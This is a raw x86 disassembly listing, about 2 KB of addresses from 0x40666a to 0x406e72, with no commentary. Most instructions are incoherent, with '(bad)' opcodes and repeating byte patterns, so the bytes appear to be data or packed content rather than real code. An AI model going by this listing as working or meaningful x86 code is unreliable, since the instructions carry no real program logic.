  40666a:	add    eax,0x92620000
  40666f:	jns    0x406636
  406671:	inc    eax
  406672:	ret    
  406673:	xor    al,0x6e
  406675:	adc    bh,BYTE PTR [edi+0x72a06373]
  40667b:	fdivr  DWORD PTR fs:[ecx+ecx*2-0x51cfbefb]
  406683:	imul   edx,DWORD PTR [ebp+0x41],0xfe21bf22
  40668a:	bound  esp,QWORD PTR [eax-0x58]
  40668d:	or     eax,0x4347f114
  406692:	add    BYTE PTR [eax],al
  406694:	add    BYTE PTR [ecx+0x40],al
  406697:	bound  esp,QWORD PTR [esi+0x0]
  40669a:	inc    eax
  40669b:	add    eax,0x5400000
  4066a0:	inc    ecx
  4066a1:	inc    eax
  4066a2:	inc    eax
  4066a3:	bound  esp,QWORD PTR ds:0x25050043
  4066a9:	inc    ecx
  4066aa:	inc    ebx
  4066ab:	inc    eax
  4066ac:	test   BYTE PTR [eax+0x0],al
  4066af:	bound  ebx,QWORD PTR [eax+0x62]
  4066b2:	inc    ecx
  4066b3:	inc    eax
  4066b4:	and    ebp,DWORD PTR [eax+0x62901062]
  4066ba:	inc    edx
  4066bb:	and    ebp,eax
  4066bd:	adc    BYTE PTR [ecx+edx*2+0x62],al
  4066c1:	sar    BYTE PTR [edx-0x41],1
  4066c4:	jecxz  0x40670a
  4066c6:	add    DWORD PTR [edi],edi
  4066c8:	push   0x491753cb
  4066cd:	pushf  
  4066ce:	leave  
  4066cf:	sbb    BYTE PTR [edi+edi*4],dh
  4066d2:	adc    DWORD PTR ds:0xf544b3a5,esp
  4066d8:	sar    DWORD PTR [edi+0x632c7263],0x41
  4066df:	sbb    DWORD PTR [esi+0x21a9d99e],edi
  4066e5:	sbb    eax,0xa545241
  4066ea:	push   esi
  4066eb:	pop    esi
  4066ec:	out    dx,eax
  4066ed:	xor    al,0x10
  4066ef:	bound  eax,QWORD PTR [eax+0x41]
  4066f2:	and    eax,0x40000500
  4066f7:	inc    ebx
  4066f8:	add    eax,0x40624041
  4066fd:	inc    ebx
  4066fe:	add    eax,0x43402541
  406703:	bound  eax,QWORD PTR [eax+0x43]
  406706:	int3   
  406707:	inc    eax
  406708:	bound  eax,QWORD PTR [eax]
  40670a:	inc    ecx
  40670b:	inc    eax
  40670c:	inc    eax
  40670d:	add    eax,0xc9bfac05
  406712:	inc    ebx
  406713:	pop    esi
  406714:	loope  0x40669e
  406716:	add    edx,DWORD PTR [eax+0x30]
  406719:	dec    eax
  40671a:	enter  0x3975,0x61
  40671e:	fwait
  40671f:	add    DWORD PTR ds:0xad5ccc04,ebx
  406725:	dec    esp
  406726:	fxch   st(1)
  406728:	pop    edx
  406729:	jle    0x40673b
  40672b:	jb     0x406783
  40672d:	and    DWORD PTR [ebx+0x6],esp
  406730:	inc    edx
  406731:	bound  eax,QWORD PTR fs:[eax+0x25]
  406735:	add    BYTE PTR [esi+0x40],ah
  406738:	add    eax,0x40404143
  40673d:	inc    ebx
  40673e:	add    BYTE PTR [eax],al
  406740:	add    BYTE PTR [edx-0x34],ah
  406743:	inc    eax
  406744:	add    eax,0x40004041
  406749:	inc    ecx
  40674a:	int3   
  40674b:	add    BYTE PTR [ebx-0x7c],al
  40674e:	add    eax,0x5406240
  406753:	bound  ebp,QWORD PTR [eax+0x783a61de]
  406759:	mov    bl,0xd8
  40675b:	test   al,0x5
  40675d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40675e:	dec    ebp
  40675f:	loope  0x4067c9
  406761:	arpl   WORD PTR [ebx-0x34],bx
  406764:	int    0x94
  406766:	pusha  
  406767:	not    DWORD PTR [ebx+0x40]
  40676a:	bound  ebx,QWORD PTR [eax+0x41]
  40676d:	add    eax,0x40404340
  406772:	inc    ebx
  406773:	inc    eax
  406774:	test   BYTE PTR [eax],al
  406776:	add    eax,0x40624041
  40677b:	inc    eax
  40677c:	add    BYTE PTR [edx+0x5],ah
  40677f:	inc    ebx
  406780:	add    BYTE PTR [eax+0x78],al
  406783:	inc    ecx
  406784:	add    BYTE PTR [eax+0x41],bl
  406787:	bound  ebp,QWORD PTR [esi+0x42]
  40678a:	and    eax,0xe508a041
  40678f:	retf   
  406790:	or     al,0xbd
  406792:	inc    ecx
  406793:	in     eax,0xbe
  406795:	and    edx,DWORD PTR [eax+0x2a696225]
  40679b:	(bad)  
  40679c:	cli    
  40679d:	mov    ds:0x13673da1,eax
  4067a2:	jg     0x4067f0
  4067a4:	loopne 0x406763
  4067a6:	idiv   eax
  4067a8:	xor    al,0x4c
  4067aa:	or     ecx,DWORD PTR [eax]
  4067ac:	jno    0x4067bd
  4067ae:	loop   0x406760
  4067b0:	and    BYTE PTR [edi+eax*4+0x41],0xa3
  4067b5:	inc    eax
  4067b6:	test   BYTE PTR [eax],al
  4067b8:	int3   
  4067b9:	bound  eax,QWORD PTR ds:0xcc840f41
  4067bf:	inc    ebx
  4067c0:	add    BYTE PTR [eax+0x0],al
  4067c3:	inc    eax
  4067c4:	inc    eax
  4067c5:	inc    eax
  4067c6:	int3   
  4067c7:	add    BYTE PTR ds:0x62404341,al
  4067cd:	pop    eax
  4067ce:	add    BYTE PTR [ebx+0x40],al
  4067d1:	bound  ecx,QWORD PTR [edi]
  4067d3:	inc    eax
  4067d4:	sub    BYTE PTR [ecx],ah
  4067d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067d7:	lds    ecx,FWORD PTR [eax+0x64]
  4067da:	and    bh,BYTE PTR [edi+0x5041e726]
  4067e0:	enter  0xdf05,0x22
  4067e4:	inc    edi
  4067e5:	and    eax,0xc97242ad
  4067ea:	test   al,0x65
  4067ec:	and    bh,BYTE PTR [ebp+0x484250de]
  4067f2:	adc    BYTE PTR [edx+0x2a],cl
  4067f5:	xor    al,0x76
  4067f7:	enter  0x78bd,0x58
  4067fb:	test   al,0x8
  4067fd:	and    eax,0x2b67f861
  406802:	inc    ecx
  406803:	add    BYTE PTR [eax],ah
  406805:	sub    al,0x54
  406807:	test   al,0x9d
  406809:	arpl   WORD PTR [ebx+esi*4+0x33],ax
  40680d:	mov    cl,0x44
  40680f:	adc    BYTE PTR [eax-0x5f],bl
  406812:	add    BYTE PTR [eax],al
  406814:	inc    eax
  406815:	inc    eax
  406816:	cmovno eax,DWORD PTR ds:0x40056243
  40681d:	int3   
  40681e:	add    ah,cl
  406820:	inc    eax
  406821:	inc    eax
  406822:	bound  eax,QWORD PTR [ecx+0x0]
  406825:	add    BYTE PTR [edi],cl
  406827:	inc    ebx
  406828:	inc    eax
  406829:	inc    eax
  40682a:	add    BYTE PTR [ecx+0x43],al
  40682d:	add    eax,0x40256240
  406832:	bound  eax,QWORD PTR [eax]
  406834:	int3   
  406835:	xchg   esi,eax
  406836:	inc    eax
  406837:	mov    ?,WORD PTR [eax]
  406839:	dec    eax
  40683a:	push   edx
  40683b:	test   al,0xe8
  40683d:	pushf  
  40683e:	mov    ds:0x420269a5,al
  406843:	adc    BYTE PTR [eax-0x15d6db6c],ch
  406849:	add    eax,0x4140cc00
  40684e:	inc    eax
  40684f:	inc    ebx
  406850:	bound  esp,QWORD PTR ds:0x41400043
  406856:	add    BYTE PTR [eax],al
  406858:	add    eax,0x43624062
  40685d:	inc    ecx
  40685e:	inc    eax
  40685f:	inc    eax
  406860:	inc    eax
  406861:	add    eax,0x40624340
  406866:	add    eax,0x40664140
  40686b:	retf   
  40686c:	mov    esp,0xea232548
  406871:	and    DWORD PTR [eax+0x34057b48],ebp
  406877:	shr    BYTE PTR [edi+0x35],1
  40687a:	dec    esp
  40687b:	inc    esp
  40687c:	xor    cl,bl
  40687e:	inc    ecx
  40687f:	dec    edi
  406880:	and    ah,BYTE PTR [ebx]
  406882:	inc    ebx
  406883:	add    BYTE PTR ds:0x41107840,al
  406889:	bound  eax,QWORD PTR [eax+0x40]
  40688c:	sldt   WORD PTR [eax-0x34]
  406890:	js     0x4068f4
  406892:	add    eax,0x40664143
  406897:	inc    ebx
  406898:	add    BYTE PTR [ecx+0x5],al
  40689b:	js     0x4068dd
  40689d:	bound  eax,QWORD PTR [eax+0x0]
  4068a0:	inc    eax
  4068a1:	aas    
  4068a2:	inc    ecx
  4068a3:	push   esp
  4068a4:	mov    edi,0xfe2fddc5
  4068a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068aa:	xor    al,0x66
  4068ac:	sub    bh,BYTE PTR [esp+esi*1]
  4068af:	inc    edx
  4068b0:	arpl   WORD PTR ds:0x6551b203,cx
  4068b6:	stos   BYTE PTR es:[edi],al
  4068b7:	and    BYTE PTR [ecx],dh
  4068b9:	repz mov ah,0x60
  4068bc:	inc    esi
  4068bd:	jno    0x40686a
  4068bf:	adc    DWORD PTR [ebx+0x4169654a],esp
  4068c5:	cld    
  4068c6:	inc    ecx
  4068c7:	inc    ebx
  4068c8:	inc    eax
  4068c9:	inc    eax
  4068ca:	add    eax,0x434162
  4068cf:	inc    eax
  4068d0:	add    BYTE PTR [edx+0x5],ah
  4068d3:	inc    eax
  4068d4:	adc    BYTE PTR [edx+0x40],ah
  4068d7:	inc    ebx
  4068d8:	inc    ecx
  4068d9:	add    eax,0x4340
  4068de:	add    eax,0x404162
  4068e3:	add    BYTE PTR [eax+0x43],al
  4068e6:	inc    eax
  4068e7:	add    eax,0x52332590
  4068ec:	adc    al,0xc8
  4068ef:	leave  
  4068f0:	scas   eax,DWORD PTR es:[edi]
  4068f1:	sub    esp,DWORD PTR [ecx]
  4068f3:	dec    eax
  4068f4:	ret    
  4068f5:	inc    ebp
  4068f6:	pop    ds
  4068f7:	pop    esi
  4068f8:	lock inc esp
  4068fa:	mov    edi,0xab3902f5
  4068ff:	ror    DWORD PTR [edx+0x4661e761],0x35
  406906:	mov    eax,0xe5605fb4
  40690b:	push   ebx
  40690c:	bound  ebp,QWORD PTR [eax+0x61b80d79]
  406912:	cld    
  406913:	sbb    al,0x4c
  406915:	rcr    BYTE PTR [edi-0x5c9c7537],0xa8
  40691c:	sub    DWORD PTR [edx],0x404a62
  406922:	add    BYTE PTR [ecx+0x43],al
  406925:	add    eax,0x41784062
  40692a:	inc    eax
  40692b:	inc    eax
  40692c:	add    BYTE PTR [edi],cl
  40692e:	bound  eax,QWORD PTR [ebx+0x0]
  406931:	add    eax,0x25006240
  406936:	inc    eax
  406937:	add    eax,0x40254143
  40693c:	add    eax,0x6e620000
  406941:	mov    ds:0xf3c3103e,al
  406946:	bound  eax,QWORD PTR [esi+0x12]
  406949:	out    dx,eax
  40694a:	mov    cl,0x48
  40694c:	mov    esp,0xfb0c28cc
  406951:	sub    edi,eax
  406953:	inc    ecx
  406954:	or     eax,0x43
  406959:	inc    ecx
  40695a:	inc    eax
  40695b:	bound  esp,QWORD PTR [esi+0x0]
  40695e:	inc    eax
  40695f:	add    eax,0x5400000
  406964:	inc    ecx
  406965:	inc    eax
  406966:	inc    eax
  406967:	bound  esp,QWORD PTR ds:0x25050043
  40696d:	inc    ecx
  40696e:	inc    ebx
  40696f:	inc    eax
  406970:	test   BYTE PTR [eax+0x0],al
  406973:	bound  ebx,QWORD PTR [eax+0x62]
  406976:	inc    ecx
  406977:	inc    eax
  406978:	jl     0x4069c5
  40697a:	int    0xad
  40697c:	xor    edi,DWORD PTR [ecx]
  40697e:	pusha  
  40697f:	retf   
  406980:	mov    al,ds:0xe2e95035
  406985:	cmp    eax,0x506328ac
  40698a:	add    BYTE PTR [ebx+0x2f],cl
  40698d:	test   eax,0x3a674452
  406992:	inc    esi
  406993:	xchg   esp,eax
  406994:	push   cs
  406995:	cmp    eax,0x10743c4e
  40699a:	inc    eax
  40699b:	and    BYTE PTR [eax],dl
  40699d:	bound  eax,QWORD PTR [eax+0x41]
  4069a0:	and    eax,0x40000500
  4069a5:	inc    ebx
  4069a6:	add    eax,0x40624041
  4069ab:	inc    ebx
  4069ac:	add    eax,0x43402541
  4069b1:	bound  eax,QWORD PTR [eax+0x43]
  4069b4:	int3   
  4069b5:	inc    eax
  4069b6:	bound  eax,QWORD PTR [eax]
  4069b8:	inc    ecx
  4069b9:	inc    eax
  4069ba:	inc    eax
  4069bb:	add    eax,0x34bf2505
  4069c0:	xor    BYTE PTR [ebx+0x7c],ah
  4069c3:	cmp    al,0x5b
  4069c5:	push   ebp
  4069c6:	ror    DWORD PTR [ecx-0x26],0x1
  4069ca:	data16 mov WORD PTR [eax-0x3bde0a5f],cs
  4069d1:	pop    edi
  4069d2:	fld    TBYTE PTR [eax+0x45c10ee3]
  4069d8:	ror    BYTE PTR ds:0x2527549c,0xff
  4069df:	in     al,0x4d
  4069e1:	pop    edx
  4069e2:	bound  eax,QWORD PTR [eax+0x25]
  4069e5:	add    BYTE PTR [esi+0x40],ah
  4069e8:	add    eax,0x40404143
  4069ed:	inc    ebx
  4069ee:	add    BYTE PTR [eax],al
  4069f0:	add    BYTE PTR [edx-0x34],ah
  4069f3:	inc    eax
  4069f4:	add    eax,0x40004041
  4069f9:	inc    ecx
  4069fa:	int3   
  4069fb:	add    BYTE PTR [ebx-0x7c],al
  4069fe:	add    eax,0x5406240
  406a03:	bound  ecx,QWORD PTR [edi+0x30]
  406a06:	imul   esi,DWORD PTR [eax-0x41],0x7d
  406a0a:	sub    DWORD PTR [edx+0x231ecb34],esi
  406a10:	ret    0x1548
  406a13:	pusha  
  406a14:	dec    edi
  406a15:	inc    eax
  406a16:	jae    0x406a3b
  406a18:	repz inc ebp
  406a1a:	addr16 (bad) 
  406a1c:	in     al,0x40
  406a1e:	cwde   
  406a1f:	jecxz  0x406a5d
  406a21:	dec    esi
  406a22:	test   ebp,ecx
  406a24:	imul   ecx,DWORD PTR [edi+0x76],0x1f
  406a28:	and    ebp,DWORD PTR [eax]
  406a2a:	bound  edx,QWORD PTR [eax+0x638f9442]
  406a30:	inc    edx
  406a31:	(bad)  
  406a32:	dec    eax
  406a33:	arpl   WORD PTR ds:0x21a103a8,ax
  406a39:	add    DWORD PTR ds:0xf240d9b0,edi
  406a3f:	inc    eax
  406a40:	bound  ebx,QWORD PTR [eax+0x41]
  406a43:	add    eax,0x40404340
  406a48:	inc    ebx
  406a49:	inc    eax
  406a4a:	test   BYTE PTR [eax],al
  406a4c:	add    eax,0x40624041
  406a51:	inc    eax
  406a52:	add    BYTE PTR [edx+0x5],ah
  406a55:	inc    ebx
  406a56:	add    BYTE PTR [eax+0x78],al
  406a59:	inc    ecx
  406a5a:	add    BYTE PTR [eax+0x41],bl
  406a5d:	bound  eax,QWORD PTR [edi+edx*2]
  406a60:	in     al,0x21
  406a62:	add    eax,0x2782b218
  406a67:	cmp    edx,ebx
  406a69:	inc    eax
  406a6a:	test   eax,0x484f0005
  406a70:	adc    BYTE PTR ds:0x8e86634f,ah
  406a76:	mov    eax,ds:0x41fd44ed
  406a7b:	adc    al,0x3d
  406a7d:	cli    
  406a7e:	adc    dl,BYTE PTR [edi-0xb]
  406a81:	bound  esp,QWORD PTR [edi]
  406a83:	sbb    BYTE PTR [ecx-0x3dccdf71],dh
  406a89:	popa   
  406a8a:	sub    cl,cl
  406a8c:	add    eax,0xce572ff5
  406a91:	and    BYTE PTR [esi+0x62],al
  406a94:	xchg   BYTE PTR [esi],bl
  406a96:	inc    esp
  406a97:	aas    
  406a98:	dec    esp
  406a99:	fnstcw WORD PTR [eax]
  406a9b:	fild   WORD PTR [eax-0x7c]
  406a9e:	add    ah,cl
  406aa0:	bound  eax,QWORD PTR ds:0xcc840f41
  406aa6:	inc    ebx
  406aa7:	add    BYTE PTR [eax+0x0],al
  406aaa:	inc    eax
  406aab:	inc    eax
  406aac:	inc    eax
  406aad:	int3   
  406aae:	add    BYTE PTR ds:0x62404341,al
  406ab4:	pop    eax
  406ab5:	add    BYTE PTR [ebx+0x40],al
  406ab8:	bound  ecx,QWORD PTR [edi]
  406aba:	inc    eax
  406abb:	xor    eax,DWORD PTR [ebp-0x5f]
  406abe:	dec    edi
  406abf:	aad    0x74
  406ac1:	in     al,0x81
  406ac3:	mov    al,0x92
  406ac5:	sub    esp,DWORD PTR [ecx-0x57575e92]
  406acb:	add    eax,0xe5bf2164
  406ad0:	bound  eax,QWORD PTR [edx+0x76f68637]
  406ad6:	inc    eax
  406ad7:	sar    DWORD PTR [ebp+0x6765cb6a],0x25
  406ade:	loop   0x406a70
  406ae0:	enter  0x6264,0xaf
  406ae4:	mov    DWORD PTR [edi-0x7f9840f7],esi
  406aea:	add    DWORD PTR ds:0x278e,eax
  406af0:	inc    eax
  406af1:	inc    eax
  406af2:	cmovno eax,DWORD PTR ds:0x40056243
  406af9:	int3   
  406afa:	add    ah,cl
  406afc:	inc    eax
  406afd:	inc    eax
  406afe:	bound  eax,QWORD PTR [ecx+0x0]
  406b01:	add    BYTE PTR [edi],cl
  406b03:	inc    ebx
  406b04:	inc    eax
  406b05:	inc    eax
  406b06:	add    BYTE PTR [ecx+0x43],al
  406b09:	add    eax,0x40256240
  406b0e:	bound  eax,QWORD PTR [eax]
  406b10:	fs pop es
  406b12:	shr    BYTE PTR [eax+edi*2-0x7a],0x87
  406b17:	xchg   DWORD PTR [eax+0x6362647a],esp
  406b1d:	cmp    al,0x4c
  406b1f:	push   es
  406b20:	rsqrtps xmm7,xmm0
  406b23:	mov    dl,0x9c
  406b25:	scas   al,BYTE PTR es:[edi]
  406b26:	ret    
  406b27:	sub    DWORD PTR [esi-0x40],ecx
  406b2a:	test   al,0x60
  406b2c:	and    eax,DWORD PTR ds:0x43e202de
  406b32:	push   esp
  406b33:	(bad)
  406b38:	push   edi
  406b39:	and    DWORD PTR [esp+esi*1+0x74383315],esi
  406b40:	add    eax,0x4140cc00
  406b45:	inc    eax
  406b46:	inc    ebx
  406b47:	bound  esp,QWORD PTR ds:0x41400043
  406b4d:	add    BYTE PTR [eax],al
  406b4f:	add    eax,0x43624062
  406b54:	inc    ecx
  406b55:	inc    eax
  406b56:	inc    eax
  406b57:	inc    eax
  406b58:	add    eax,0x40624340
  406b5d:	add    eax,0x40664140
  406b62:	aas    
  406b63:	push   ebp
  406b64:	xor    edi,DWORD PTR [eax+eax*4]
  406b67:	lods   eax,DWORD PTR ds:[esi]
  406b68:	mov    cl,0x81
  406b6a:	jae    0x406bb1
  406b6c:	repz gs jle 0x406b75
  406b70:	xlat   BYTE PTR ds:[ebx]
  406b71:	dec    ebp
  406b72:	push   edi
  406b73:	shr    DWORD PTR [edx+0x66],0x80
  406b77:	xchg   al,ch
  406b79:	add    DWORD PTR [ebx+0x0],0x10784005
  406b80:	inc    ecx
  406b81:	bound  eax,QWORD PTR [eax+0x40]
  406b84:	sldt   WORD PTR [eax-0x34]
  406b88:	js     0x406bec
  406b8a:	add    eax,0x40664143
  406b8f:	inc    ebx
  406b90:	add    BYTE PTR [ecx+0x5],al
  406b93:	js     0x406bd5
  406b95:	bound  eax,QWORD PTR [eax+0x0]
  406b98:	inc    eax
  406b99:	cmp    DWORD PTR [ebx+0x79],edx
  406b9c:	push   edi
  406b9d:	mov    ah,0x65
  406b9f:	jmp    0x69bc591a
  406ba4:	and    al,0xb4
  406ba6:	lods   al,BYTE PTR ds:[esi]
  406ba7:	jge    0x406b2a
  406ba9:	push   edi
  406baa:	mov    al,0x44
  406bac:	in     eax,0xd5
  406bae:	add    eax,0x623f477e
  406bb3:	jl     0x406bf7
  406bb5:	jae    0x406b3d
  406bb7:	and    DWORD PTR [eax],eax
  406bb9:	dec    eax
  406bba:	lds    ebp,FWORD PTR [edx-0x58]
  406bbd:	cmp    BYTE PTR [ecx+ebx*2],0x33
  406bc1:	in     eax,dx
  406bc2:	dec    edi
  406bc3:	dec    eax
  406bc4:	adc    BYTE PTR [edx],dh
  406bc6:	stos   DWORD PTR es:[edi],eax
  406bc7:	inc    ecx
  406bc8:	inc    ebx
  406bc9:	inc    eax
  406bca:	inc    eax
  406bcb:	add    eax,0x434162
  406bd0:	inc    eax
  406bd1:	add    BYTE PTR [edx+0x5],ah
  406bd4:	inc    eax
  406bd5:	adc    BYTE PTR [edx+0x40],ah
  406bd8:	inc    ebx
  406bd9:	inc    ecx
  406bda:	add    eax,0x4340
  406bdf:	add    eax,0x404162
  406be4:	add    BYTE PTR [eax+0x43],al
  406be7:	inc    eax
  406be8:	add    eax,0xf956be45
  406bed:	xchg   DWORD PTR [edx-0x7c],eax
  406bf0:	add    eax,0x2f449ca
  406bf5:	fld    QWORD PTR [eax+0x1528665]
  406bfb:	push   esi
  406bfc:	push   edx
  406bfd:	std    
  406bfe:	ret    
  406bff:	loopne 0x406c25
  406c01:	sub    bl,dl
  406c03:	inc    eax
  406c04:	add    BYTE PTR [eax],al
  406c06:	inc    ecx
  406c07:	inc    ebx
  406c08:	add    eax,0x41784062
  406c0d:	inc    eax
  406c0e:	inc    eax
  406c0f:	add    BYTE PTR [edi],cl
  406c11:	bound  eax,QWORD PTR [ebx+0x0]
  406c14:	add    eax,0x25006240
  406c19:	inc    eax
  406c1a:	add    eax,0x40254143
  406c1f:	add    eax,0xff620000
  406c24:	ficom  DWORD PTR [eax-0x50]
  406c27:	gs stos BYTE PTR es:[edi],al
  406c29:	or     al,BYTE PTR cs:[edx]
  406c2c:	test   BYTE PTR [edi+0x45],ah
  406c2f:	test   eax,0x412e1b05
  406c34:	bound  ecx,QWORD PTR [esi-0x4e]
  406c37:	pushf  
  406c38:	xchg   dl,dh
  406c3a:	add    eax,0x602018e0
  406c3f:	inc    eax
  406c40:	gs dec eax
  406c42:	xchg   ebx,eax
  406c43:	pop    ss
  406c44:	dec    esp
  406c45:	sub    DWORD PTR [edx-0x11],esp
  406c48:	test   eax,0x43e37c
  406c4d:	add    BYTE PTR [eax],al
  406c4f:	inc    ecx
  406c50:	inc    eax
  406c51:	bound  esp,QWORD PTR [esi+0x0]
  406c54:	inc    eax
  406c55:	add    eax,0x5400000
  406c5a:	inc    ecx
  406c5b:	inc    eax
  406c5c:	inc    eax
  406c5d:	bound  esp,QWORD PTR ds:0x25050043
  406c63:	inc    ecx
  406c64:	inc    ebx
  406c65:	inc    eax
  406c66:	test   BYTE PTR [eax+0x0],al
  406c69:	bound  ebx,QWORD PTR [eax+0x62]
  406c6c:	inc    ecx
  406c6d:	inc    eax
  406c6e:	inc    eax
  406c6f:	(bad)  
  406c70:	retf   
  406c71:	xor    eax,0x743053d
  406c76:	mov    ah,0x9d
  406c78:	test   al,0x80
  406c7a:	je     0x406c02
  406c7c:	cs ss jb 0x406cee
  406c80:	or     ch,al
  406c82:	sbb    BYTE PTR [ebx],bh
  406c84:	sub    eax,0x7b3b4189
  406c89:	jno    0x406cef
  406c8b:	test   al,0xca
  406c8d:	jae    0x406c2f
  406c8f:	outs   dx,BYTE PTR ds:[esi]
  406c90:	bound  edx,QWORD PTR [edi+0x10]
  406c93:	bound  eax,QWORD PTR [eax+0x41]
  406c96:	and    eax,0x40000500
  406c9b:	inc    ebx
  406c9c:	add    eax,0x40624041
  406ca1:	inc    ebx
  406ca2:	add    eax,0x43402541
  406ca7:	bound  eax,QWORD PTR [eax+0x43]
  406caa:	int3   
  406cab:	inc    eax
  406cac:	bound  eax,QWORD PTR [eax]
  406cae:	inc    ecx
  406caf:	inc    eax
  406cb0:	inc    eax
  406cb1:	add    eax,0x1d059c05
  406cb6:	xchg   DWORD PTR [edi],ecx
  406cb8:	arpl   WORD PTR [ebx],sp
  406cba:	arpl   WORD PTR ds:0x4035e386,ax
  406cc0:	sub    eax,0x648710b8
  406cc5:	pop    ds
  406cc6:	adc    DWORD PTR [esp+edi*8],0x40214265
  406ccd:	push   0xffffff9f
  406ccf:	dec    ebp
  406cd0:	bound  eax,QWORD PTR [ebx-0x1cd1be27]
  406cd6:	push   0x9b004da2
  406cdb:	dec    esi
  406cdc:	sbb    al,0x9b
  406cde:	add    al,0x55
  406ce0:	loopne 0x406d44
  406ce2:	test   al,0xd0
  406ce4:	bound  edx,QWORD PTR [esi+0x435ebf0c]
  406cea:	dec    edx
  406ceb:	fs test eax,0x2540622a
  406cf1:	add    BYTE PTR [esi+0x40],ah
  406cf4:	add    eax,0x40404143
  406cf9:	inc    ebx
  406cfa:	add    BYTE PTR [eax],al
  406cfc:	add    BYTE PTR [edx-0x34],ah
  406cff:	inc    eax
  406d00:	add    eax,0x40004041
  406d05:	inc    ecx
  406d06:	int3   
  406d07:	add    BYTE PTR [ebx-0x7c],al
  406d0a:	add    eax,0x5406240
  406d0f:	bound  edi,QWORD PTR [esi+0x72]
  406d12:	cmp    eax,0xb845ea3c
  406d17:	lahf   
  406d18:	add    al,0x6
  406d1a:	push   ebp
  406d1b:	sbb    BYTE PTR [ebx-0x3],0x64
  406d1f:	dec    ecx
  406d20:	xor    al,0x55
  406d22:	bound  ebp,QWORD PTR [eax+0x624067a8]
  406d28:	pop    eax
  406d29:	inc    ecx
  406d2a:	add    eax,0x40404340
  406d2f:	inc    ebx
  406d30:	inc    eax
  406d31:	test   BYTE PTR [eax],al
  406d33:	add    eax,0x40624041
  406d38:	inc    eax
  406d39:	add    BYTE PTR [edx+0x5],ah
  406d3c:	inc    ebx
  406d3d:	add    BYTE PTR [eax+0x78],al
  406d40:	inc    ecx
  406d41:	add    BYTE PTR [eax+0x41],bl
  406d44:	bound  edx,QWORD PTR [edx-0x23]
  406d47:	adc    eax,0xf74b83a9
  406d4c:	inc    edx
  406d4d:	bound  ebx,QWORD PTR [edi+0x1]
  406d50:	cmp    dl,BYTE PTR [eax-0x7f530eca]
  406d56:	aad    0x73
  406d58:	aas    
  406d59:	(bad)  
  406d5a:	aam    0x62
  406d5c:	jae    0x406d23
  406d5e:	pop    edx
  406d5f:	add    DWORD PTR [eax+0x40],edx
  406d62:	test   BYTE PTR [eax],al
  406d64:	int3   
  406d65:	bound  eax,QWORD PTR ds:0xcc840f41
  406d6b:	inc    ebx
  406d6c:	add    BYTE PTR [eax+0x0],al
  406d6f:	inc    eax
  406d70:	inc    eax
  406d71:	inc    eax
  406d72:	int3   
  406d73:	add    BYTE PTR ds:0x62404341,al
  406d79:	pop    eax
  406d7a:	add    BYTE PTR [ebx+0x40],al
  406d7d:	bound  ecx,QWORD PTR [edi]
  406d7f:	inc    eax
  406d80:	mov    eax,0x4056924d
  406d85:	dec    esi
  406d86:	inc    esi
  406d87:	bound  eax,QWORD PTR ds:0x4057bf43
  406d8d:	stos   DWORD PTR es:[edi],eax
  406d8e:	sub    BYTE PTR [edi+0x43],0x48
  406d92:	mov    ah,0xcd
  406d94:	push   eax
  406d95:	out    dx,eax
  406d96:	or     DWORD PTR ds:0x40400000,ecx
  406d9c:	cmovno eax,DWORD PTR ds:0x40056243
  406da3:	int3   
  406da4:	add    ah,cl
  406da6:	inc    eax
  406da7:	inc    eax
  406da8:	bound  eax,QWORD PTR [ecx+0x0]
  406dab:	add    BYTE PTR [edi],cl
  406dad:	inc    ebx
  406dae:	inc    eax
  406daf:	inc    eax
  406db0:	add    BYTE PTR [ecx+0x43],al
  406db3:	add    eax,0x40256240
  406db8:	bound  eax,QWORD PTR [eax]
  406dba:	dec    eax
  406dbb:	or     dl,dh
  406dbd:	fst    DWORD PTR [ecx+0x5d]
  406dc0:	out    dx,al
  406dc1:	bound  eax,QWORD PTR [ebx+ecx*8+0x23a84262]
  406dc8:	inc    eax
  406dc9:	and    ebx,eax
  406dcb:	inc    ebx
  406dcc:	jo     0x406d7b
  406dce:	dec    ecx
  406dcf:	outs   dx,DWORD PTR ds:[esi]
  406dd0:	pusha  
  406dd1:	adc    BYTE PTR [ebx+0x7c],al
  406dd4:	clc    
  406dd5:	inc    ecx
  406dd6:	xor    al,0xf6
  406dd8:	enter  0xad21,0x4c
  406ddc:	bound  esp,QWORD PTR [eax+0x46]
  406ddf:	add    eax,DWORD PTR [edx]
  406de1:	inc    edi
  406de2:	sub    al,0x62
  406de4:	sbb    dl,BYTE PTR [eax]
  406de6:	fcmovb st,st(5)
  406de8:	and    eax,0xb244a8b9
  406ded:	push   edi
  406dee:	and    BYTE PTR [edi],dh
  406df0:	gs stos DWORD PTR es:[edi],eax
  406df2:	adc    BYTE PTR [edx+0x40cc0005],al
  406df8:	inc    ecx
  406df9:	inc    eax
  406dfa:	inc    ebx
  406dfb:	bound  esp,QWORD PTR ds:0x41400043
  406e01:	add    BYTE PTR [eax],al
  406e03:	add    eax,0x43624062
  406e08:	inc    ecx
  406e09:	inc    eax
  406e0a:	inc    eax
  406e0b:	inc    eax
  406e0c:	add    eax,0x40624340
  406e11:	add    eax,0x40664140
  406e16:	fsubr  st,st(5)
  406e18:	dec    edi
  406e19:	out    0x83,al
  406e1b:	jae    0x406dc9
  406e1d:	ret    
  406e1e:	loop   0x406e79
  406e20:	mov    fs:0x42aa249,eax
  406e26:	arpl   ax,dx
  406e28:	pop    ebp
  406e29:	mov    ah,0x81
  406e2b:	sub    edi,DWORD PTR [ebx+0x6375affb]
  406e31:	cld    
  406e32:	hlt    
  406e33:	xor    eax,0x70206264
  406e38:	or     eax,0x56618368
  406e3d:	sub    cl,bh
  406e3f:	push   ebx
  406e40:	add    BYTE PTR [ebx+0x0],0x5
  406e44:	inc    eax
  406e45:	js     0x406e57
  406e47:	inc    ecx
  406e48:	bound  eax,QWORD PTR [eax+0x40]
  406e4b:	sldt   WORD PTR [eax-0x34]
  406e4f:	js     0x406eb3
  406e51:	add    eax,0x40664143
  406e56:	inc    ebx
  406e57:	add    BYTE PTR [ecx+0x5],al
  406e5a:	js     0x406e9c
  406e5c:	bound  eax,QWORD PTR [eax+0x0]
  406e5f:	inc    eax
  406e60:	dec    esi
  406e61:	dec    edx
  406e62:	sbb    al,0x46
  406e64:	cmc    
  406e65:	les    esi,FWORD PTR [eax-0x5dfd4fea]
  406e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e6c:	sub    DWORD PTR [eax+0x6f9b58a8],edi
  406e72:	pop    ds
